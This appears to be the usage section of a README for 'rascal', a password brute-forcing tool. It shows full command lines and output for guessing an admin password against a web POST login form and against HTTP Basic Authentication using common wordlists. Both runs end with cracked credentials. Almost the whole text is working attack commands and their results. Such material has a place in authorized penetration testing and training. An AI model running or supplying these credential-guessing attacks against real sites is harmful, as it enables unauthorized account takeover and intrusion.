### POST

    C:\tools\> .\rascal.exe --post -u https://***.com/123123/login.php -w C:\tools\xato-10k.txt --username admin --username_field user_id --password_field passwd --success_text OK

        -- SETTINGS VERIFICATION --
        scheme: https
        url: https://***.com/123123/login.php
        username: admin
        password list: C:\tools\xato-10k.txt
        username post form field: user_id
        password post form field: passwd
        success message: OK
        failure message: None

    Does this look OK? (Y/n)
    Prepared wordlist in memory with 10000 entries.
    [+] admin:1999

---

### Basic Authentication

    $ python3 rascal.py --basic -u http://***.com/123123/321 -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt --username admin --failure_text 'Restricted Content'
    
            -- SETTINGS VERIFICATION --
            scheme: http
            url: http://***.com/123123/321
            username: admin
            password list: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt
            success message: None
            failure message: Restricted Content
            custom user agent: None
            
    Does this look OK? (Y/n) 
    Prepared wordlist in memory with 1000 entries.
    
        ##########
        Sample from response headers.
        I.e., Build your failure string from header details:
        Basic realm="Restricted Content"
        ##########
        
    [+] admin:12345